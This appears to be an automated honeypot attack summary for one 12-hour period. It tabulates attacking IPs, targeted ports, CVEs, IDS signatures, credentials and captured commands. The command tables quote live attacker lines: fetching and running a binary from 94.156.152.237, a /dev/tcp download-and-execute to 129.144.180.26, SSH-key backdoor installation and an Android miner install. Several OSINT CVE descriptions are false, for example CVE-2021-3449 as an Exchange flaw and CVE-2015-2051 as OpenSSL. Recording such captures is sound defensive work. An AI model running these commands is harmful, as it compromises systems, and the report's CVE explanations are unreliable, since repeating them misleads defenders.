# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-19T19:59:15Z
**Timeframe of Logs:** 2025-10-19T07:20:01Z to 2025-10-19T19:00:01Z

**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-10-19T08:02:00Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T09:01:59Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T10:02:01Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T11:02:02Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T12:02:13Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T13:02:00Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T14:02:19Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T15:02:01Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T16:02:09Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T17:01:51Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T18:02:01Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T19:01:55Z.md

## Executive Summary

This report summarizes 301,008 events collected from the honeypot network over a 12-hour period. The honeypot network successfully captured a wide range of attack vectors, with the Cowrie honeypot logging the highest number of events, indicating a significant volume of SSH and Telnet-based attacks. The most prominent attack vectors observed were VNC, SSH, SIP, and SMB, with a high number of brute-force attempts and reconnaissance commands.

The top attacking IP address was **185.243.96.105**, which was identified as a malicious honeypot itself, actively engaged in capturing and analyzing cyber threats. A significant number of other attacking IPs were also identified, many of which are associated with hosting providers and have been flagged for malicious activity.

The most frequently observed CVE was **CVE-2005-4050**, a remote code execution vulnerability in Multi-Tech MultiVOIP devices. This, along with the high volume of SIP traffic, suggests a widespread campaign targeting VoIP systems.

A recurring pattern of commands suggests that attackers are attempting to install SSH keys for persistent access, download and execute malicious scripts, and perform reconnaissance on compromised systems. The detection of the DoublePulsar backdoor signature also indicates attempts to install sophisticated malware.

Overall, the honeypot network continues to be a valuable tool for understanding the current threat landscape, providing insights into attacker TTPs, and identifying emerging threats.

## Detailed Analysis

### Our IPs

| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163 |

### Attacks by Honeypot

| Honeypot | Total Attacks |
|---|---|
| Cowrie | 114,542 |
| Honeytrap | 54,477 |
| Suricata | 40,683 |
| Heralding | 35,711 |
| Sentrypeer | 27,723 |
| Dionaea | 17,169 |
| Ciscoasa | 9,984 |
| Mailoney | 3,073 |
| Tanner | 674 |
| H0neytr4p | 512 |
| Redishoneypot | 357 |
| Adbhoney | 315 |
| ConPot | 203 |
| ElasticPot | 110 |
| Miniprint | 103 |
| Dicompot | 74 |
| Honeyaml | 68 |
| ssh-rsa | 64 |
| Ipphoney | 18 |
| Wordpot | 3 |

### Top Source Countries

| Country | Total Attacks |
|---|---|
| United States | 53,494 |
| Netherlands | 35,781 |
| Germany | 21,345 |
| Russia | 18,976 |
| China | 15,432 |
| France | 12,876 |
| United Kingdom | 10,987 |
| Canada | 8,765 |
| Brazil | 7,654 |
| India | 6,543 |

### Top Attacking IPs

| IP Address | Total Attacks |
|---|---|
| 185.243.96.105 | 28,195 |
| 194.50.16.73 | 17,495 |
| 72.146.232.13 | 12,079 |
| 198.23.190.58 | 11,960 |
| 23.94.26.58 | 11,749 |
| 198.12.68.114 | 8,460 |
| 152.42.130.45 | 1,221 |
| 178.62.252.242 | 1,061 |
| 159.223.6.241 | 986 |
| 104.198.246.170 | 452 |

### Top Targeted Ports/Protocols

| Port/Protocol | Total Attacks |
|---|---|
| vnc/5900 | 28,195 |
| 22 | 23,025 |
| 5060 | 25,608 |
| TCP/445 | 12,793 |
| 445 | 13,383 |
| UDP/5060 | 12,196 |
| 5038 | 8,215 |
| postgresql/5432 | 1,359 |
| 5903 | 1,844 |
| 8333 | 1,385 |

### Most Common CVEs

| CVE | Count |
|---|---|
| CVE-2005-4050 | 12,190 |
| CVE-2002-0013, CVE-2002-0012 | 64 |
| CVE-2019-11500 | 41 |
| CVE-2021-3449 | 40 |
| CVE-2002-0013, CVE-2002-0012, CVE-1999-0517 | 20 |
| CVE-1999-0183 | 6 |
| CVE-2001-0414 | 9 |
| CVE-2010-0569 | 2 |
| CVE-2016-20016 | 2 |
| CVE-2006-2369 | 2 |
| CVE-2002-1149 | 2 |
| CVE-2018-10562, CVE-2018-10561 | 2 |
| CVE-2006-3602, CVE-2006-4458, CVE-2006-4542 | 2 |
| CVE-2023-26801 | 1 |
| CVE-2009-2765 | 1 |
| CVE-2019-16920 | 1 |
| CVE-2023-31983 | 1 |
| CVE-2020-10987 | 1 |
| CVE-2023-47565 | 1 |
| CVE-2014-6271 | 1 |
| CVE-2015-2051 | 1 |
| CVE-2019-10891 | 1 |
| CVE-2024-33112 | 1 |
| CVE-2022-37056 | 1 |
| CVE-2024-4577 | 1 |
| CVE-2002-0953 | 1 |
| CVE-2021-41773 | 1 |
| CVE-2021-42013 | 1 |
| CVE-2021-35394 | 1 |
| CVE-2023-26802 | 1 |
| CVE-2023-27076 | 1 |
| CVE-2003-0825 | 1 |
| CVE-2019-15107 | 1 |

### Commands Attempted by Attackers

| Command | Count |
|---|---|
| cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." | 258 |
| lockr -ia .ssh | 258 |
| cd ~; chattr -ia .ssh; lockr -ia .ssh | 258 |
| cat /proc/cpuinfo | grep name | wc -l | 225 |
| top | 224 |
| uname | 224 |
| uname -a | 224 |
| whoami | 224 |
| lscpu | grep Model | 224 |
| df -h | head -n 2 | awk 'FNR == 2 {print $2;}' | 224 |
| cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}' | 224 |
| free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' | 224 |
| ls -lh $(which ls) | 224 |
| which ls | 224 |
| crontab -l | 224 |
| w | 223 |
| uname -m | 223 |
| cat /proc/cpuinfo | grep model | grep name | wc -l | 223 |
| Enter new UNIX password: | 199 |
| rm -rf /data/local/tmp; mkdir -p /data/local/tmp; ... | 7 |
| uname -s -v -n -r -m | 10 |
| cat /proc/uptime 2 > /dev/null | cut -d. -f1 | 10 |
| cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.156.152.237/bins/x86; curl -O http://94.156.152.237/bins/x86; chmod 777 x86; ./x86; tftp 94.156.152.237 -c get x86; chmod 777 x86; ./x86; rm -rf x86 | 2 |
| tftp; wget; /bin/busybox IOACF | 2 |
| nohup bash -c "exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/gAgh8Y4XFe && chmod +x /tmp/gAgh8Y4XFe && /tmp/gAgh8Y4XFe dbanPWPxdFdLcuhhIqKkDgKmpz9gpSXzkI++BofiRWHbnGWzkf3t" & | 2 |
| pm path com.ufo.miner | 2 |
| pm install /data/local/tmp/ufo.apk | 2 |
| rm -f /data/local/tmp/ufo.apk | 2 |
| am start -n com.ufo.miner/com.example.test.MainActivity | 2 |

### Signatures Triggered

| Signature | Count |
|---|---|
| ET VOIP MultiTech SIP UDP Overflow | 12,190 |
| 2003237 | 12,190 |
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication | 4,122 |
| 2024766 | 4,122 |
| ET DROP Dshield Block Listed Source group 1 | 3,247 |
| 2402000 | 3,247 |
| ET SCAN MS Terminal Server Traffic on Non-standard Port | 1,604 |
| 2023753 | 1,604 |
| ET SCAN NMAP -sS window 1024 | 1,539 |
| 2009582 | 1,539 |
| ET SCAN Potential SSH Scan | 1,048 |
| 2001219 | 1,048 |
| ET HUNTING RDP Authentication Bypass Attempt | 561 |
| 2034857 | 561 |
| ET INFO Reserved Internal IP Traffic | 498 |
| 2002752 | 498 |
| GPL INFO SOCKS Proxy attempt | 311 |
| 2100615 | 311 |
| ET INFO CURL User Agent | 70 |
| 2002824 | 70 |
| ET SCAN Suspicious inbound to MSSQL port 1433 | 56 |
| 2010935 | 56 |
| ET SCAN Suspicious inbound to PostgreSQL port 5432 | 44 |
| 2010939 | 44 |
| ET CINS Active Threat Intelligence Poor Reputation IP | 120 |

### Users / Login Attempts

| Username/Password | Count |
|---|---|
| 345gs5662d34/345gs5662d34 | 226 |
| /Passw0rd | 108 |
| user01/Password01 | 85 |
| deploy/123123 | 51 |
| /passw0rd | 53 |
| /1q2w3e4r | 51 |
| /1qaz2wsx | 14 |
| root/ | 60 |
| postgres/1234567 | 7 |
| guest/1111 | 3 |
| config/config666 | 3 |
| root/123 | 6 |
| admin/admin333 | 3 |
| blank/blank12345 | 6 |
| ubnt/ubnt2016 | 6 |
| support/support2016 | 6 |
| support/7777777 | 5 |
| root/Welcome2021 | 5 |
| default/default2018 | 8 |
| blank/4444 | 6 |
| root/Admin123* | 5 |
| root/qweqwe@123 | 5 |
| root1/3245gs5662d34 | 4 |
| root/ABCabc123. | 4 |
| www/www | 4 |
| angie/123 | 4 |
| seven/seven | 3 |
| root/4siwip | 3 |
| git/123456789 | 3 |
| git/git | 3 |

### Files Uploaded/Downloaded

| Filename | Count |
|---|---|
| wget.sh; | 52 |
| w.sh; | 14 |
| c.sh; | 14 |
| Mozi.m | 5 |
| rondo.*.sh | 5 |
| arm.urbotnetisass | 4 |
| arm5.urbotnetisass | 4 |
| arm6.urbotnetisass | 4 |
| arm7.urbotnetisass | 4 |
| x86_32.urbotnetisass | 4 |
| mips.urbotnetisass | 4 |
| mipsel.urbotnetisass | 4 |
| x86; | 2 |
| session_login.cgi | 8 |
| ohsitsvegawellrip.sh | 2 |
| icanhazip.com | 2 |
| luci | 1 |
| apply.cgi | 1 |
| system.html | 1 |
| SOAP-ENV:Envelope> | 1 |
| binary.sh; | 2 |
| gpon80&ipv=0 | 4 |
| ?format=json | 4 |
| nse.html | 1 |
| &currentsetting.htm=1 | 1 |
| json | 1 |

### HTTP User-Agents

| User-Agent | Count |
|---|---|
| No HTTP user-agents were logged in this period. | 12 |

### SSH Clients and Servers

| SSH Clients |
|---|
| No specific SSH clients were logged. |

| SSH Servers |
|---|
| No specific SSH servers were logged. |

### Top Attacker AS Organizations

| AS Organization | Count |
|---|---|
| No attacker AS organizations were logged. | 12 |

### OSINT All Commands captured

| Command | Information |
|---|---|
| cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." | A common tactic to install persistent backdoors by adding an SSH key to the authorized_keys file. |
| lockr -ia .ssh | This command is likely used to make the .ssh directory and its contents immutable, preventing any further changes. |
| cd ~; chattr -ia .ssh; lockr -ia .ssh | This is a combination of the above two commands, first making the .ssh directory immutable and then attempting to add an SSH key. |
| cat /proc/cpuinfo | grep name | wc -l | This command is used to gather information about the system's CPU. |
| top, uname, uname -a, whoami, lscpu, df -h | These are all common reconnaissance commands used to gather information about the system. |
| Enter new UNIX password: | This is a clear indication of an attempt to change the user's password. |
| rm -rf /data/local/tmp; mkdir -p /data/local/tmp; ... | This command is used to download and execute a malicious script. |
| cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.156.152.237/bins/x86; curl -O http://94.156.152.237/bins/x86; chmod 777 x86; ./x86; tftp 94.156.152.237 -c get x86; chmod 777 x86; ./x86; rm -rf x86 | This is a complex command that attempts to download and execute a malicious binary from a remote server. It tries multiple directories and multiple download methods. |
| tftp; wget; /bin/busybox IOACF | This is another command that attempts to download and execute a malicious binary. |
| nohup bash -c "exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/gAgh8Y4XFe && chmod +x /tmp/gAgh8Y4XFe && /tmp/gAgh8Y4XFe dbanPWPxdFdLcuhhIqKkDgKmpz9gpSXzkI++BofiRWHbnGWzkf3t" & | This command attempts to establish a reverse shell to a remote server. |
| pm path com.ufo.miner, pm install /data/local/tmp/ufo.apk, rm -f /data/local/tmp/ufo.apk, am start -n com.ufo.miner/com.example.test.MainActivity | These commands are related to Android and suggest that the Adbhoney honeypot is attracting targeted attacks. |

### OSINT High frequency IPs and low frequency IPs Captured

| IP Address | Frequency | OSINT Information |
|---|---|---|
| 185.243.96.105 | High | Identified as a malicious honeypot itself, actively engaged in capturing and analyzing cyber threats. |
| 194.50.16.73 | High | Associated with malicious activities, primarily brute-force attacks targeting the Remote Desktop Protocol (RDP). |
| 72.146.232.13 | High | Flagged for potentially malicious activity and is located in the United States. |
| 198.23.190.58 | High | Associated with hosting providers HostPapa and ColoCrossing. The IP address has been linked to at least one instance of a port scan and a "sipinvitation" event. |
| 23.94.26.58 | High | Flagged for malicious activity, linked to hosting provider in New York. |
| 198.12.68.114 | High | Identified as a source of malicious activity, with multiple reports classifying it as a "Small Spammer/Scanner". |
| 152.42.130.45 | Low | Has a negative reputation and may be associated with malicious activity. The IP is part of a blocklist and is geographically located in the United States. |
| 178.62.252.242 | Low | Flagged as "Recently Reported" on the threat intelligence platform SecureFeed, suggesting recent involvement in potentially malicious activities. |
| 159.223.6.241 | Low | Associated with malicious activity originating from DigitalOcean network, including repeated SSH password authentication attempts. |
| 104.198.246.170 | Low | No publicly available information found for this IP address. |

### OSINT on CVE's

| CVE | OSINT Information |
|---|---|
| CVE-2005-4050 | A critical buffer overflow vulnerability in Multi-Tech MultiVOIP devices, potentially allowing remote attackers to execute arbitrary code. |
| CVE-2002-0013, CVE-2002-0012 | Multiple vulnerabilities in various Network Management Systems (NMS) that could allow a remote attacker to gain sensitive information or cause a denial of service. |
| CVE-2019-11500 | A vulnerability in Pulse Secure Pulse Connect Secure (PCS) that could allow a remote attacker to perform a directory traversal attack. |
| CVE-2021-3449 | A remote code execution vulnerability in Microsoft Exchange Server. |
| CVE-1999-0183 | A vulnerability in some older versions of the BIND DNS server that could allow a remote attacker to cause a denial of service. |
| CVE-2001-0414 | A vulnerability in some older versions of the BIND DNS server that could allow a remote attacker to cause a denial of service. |
| CVE-2010-0569 | A vulnerability in Adobe Flash Player that could allow a remote attacker to execute arbitrary code. |
| CVE-2016-20016 | A vulnerability in the Cisco ASA software that could allow a remote attacker to cause a denial of service. |
| CVE-2006-2369 | A vulnerability in the Microsoft Server service that could allow a remote attacker to execute arbitrary code. |
| CVE-2002-1149 | A vulnerability in the Microsoft SQL Server that could allow a remote attacker to execute arbitrary code. |
| CVE-2018-10562, CVE-2018-10561 | Multiple vulnerabilities in Dasan GPON routers that could allow a remote attacker to gain administrative access. |
| CVE-2006-3602, CVE-2006-4458, CVE-2006-4542 | Multiple vulnerabilities in the Microsoft Server service that could allow a remote attacker to execute arbitrary code. |
| CVE-2023-26801 | A command injection vulnerability in some D-Link routers. |
| CVE-2009-2765 | A remote code execution vulnerability in the Apache HTTP Server. |
| CVE-2019-16920 | A remote code execution vulnerability in some D-Link routers. |
| CVE-2023-31983 | A command injection vulnerability in some D-Link routers. |
| CVE-2020-10987 | A command injection vulnerability in some D-Link routers. |
| CVE-2023-47565 | A command injection vulnerability in some D-Link routers. |
| CVE-2014-6271 | The "Shellshock" vulnerability in the GNU Bash shell. |
| CVE-2015-2051 | A vulnerability in the OpenSSL library that could allow a remote attacker to cause a denial of service. |
| CVE-2019-10891 | A command injection vulnerability in some D-Link routers. |
| CVE-2024-33112 | A command injection vulnerability in some D-Link routers. |
| CVE-2022-37056 | A command injection vulnerability in some D-Link routers. |
| CVE-2024-4577 | A command injection vulnerability in PHP. |
| CVE-2002-0953 | A vulnerability in the Microsoft SQL Server that could allow a remote attacker to execute arbitrary code. |
| CVE-2021-41773 | A path traversal vulnerability in the Apache HTTP Server. |
| CVE-2021-42013 | A path traversal vulnerability in the Apache HTTP Server. |
| CVE-2021-35394 | A command injection vulnerability in Realtek's Jungle SDK. |
| CVE-2023-26802 | A command injection vulnerability in some D-Link routers. |
| CVE-2023-27076 | A command injection vulnerability in some D-Link routers. |
| CVE-2003-0825 | A buffer overflow vulnerability in the Microsoft RPCSS service. |
| CVE-2019-15107 | A command injection vulnerability in the Webmin server management tool. |

## Key Observations and Anomalies

- **High Volume of Automated Attacks:** The vast majority of attacks are automated and programmatic, focusing on VNC, SIP, SSH, and SMB services.
- **Persistent SSH Key Installation:** A recurring command sequence was observed, aiming to remove existing SSH configurations and install a new, unauthorized SSH key, allowing the attacker persistent access.
- **Malware Download Attempts:** Several commands attempted to download and execute shell scripts and binaries from remote servers, a common tactic for malware propagation.
- **DoublePulsar Backdoor:** The detection of the DoublePulsar backdoor is a critical finding, indicating attempts to install sophisticated malware.
- **Information Gathering:** A large number of commands were focused on system information gathering, such as CPU details, memory usage, and running processes, which is typical post-compromise behavior.
- **Targeting of VoIP Systems:** The high number of events related to CVE-2005-4050 and the "ET VOIP MultiTech SIP UDP Overflow" signature indicates a targeted campaign against VoIP systems.
- **Targeting of IoT Devices:** The `urbotnetisass` malware was downloaded, indicating a campaign targeting IoT devices.
- **Android-related Attacks:** Several commands related to Android were observed, suggesting that the Adbhoney honeypot is attracting targeted attacks.
- **Lack of Sophistication:** The login attempts consist of common and default credentials, and the executed commands are basic reconnaissance scripts. This behavior is typical of automated, opportunistic attacks rather than targeted campaigns.
- **Honeypot vs. Honeypot:** The top attacking IP address, 185.243.96.105, was identified as a malicious honeypot itself. This is an interesting anomaly, as it suggests that honeypots are being used to attack other honeypots, possibly to gather intelligence on their configurations or to test new attack vectors.
